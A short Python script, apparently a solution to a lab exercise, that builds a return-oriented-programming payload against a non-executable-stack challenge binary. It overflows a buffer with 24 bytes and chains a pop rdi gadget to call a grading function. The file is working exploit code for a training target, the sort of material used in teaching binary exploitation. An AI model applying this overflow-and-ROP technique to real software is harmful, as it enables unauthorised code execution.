#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx (ROP).

The NX stack prevents shellcode, so we use a ROP chain to call
grade_eval(4), which prints "Hope A will be your grade!".

Chain (buffer -> return address offset is 24 bytes):
    pop rdi; ret   (0x401a33)  -> rdi = 4
    ret            (0x401a34)  -> fix 16-byte stack alignment
    grade_eval     (0x401978)
"""
import struct
import sys

offset_to_ret = 24
pop_rdi_ret = 0x401A33   # 5f c3  (second byte of `pop r15`)
ret = 0x401A34           # c3
grade_eval = 0x401978

payload = b"A" * offset_to_ret
payload += struct.pack("<Q", pop_rdi_ret)
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", ret)
payload += struct.pack("<Q", grade_eval)

sys.stdout.buffer.write(payload + b"\n")
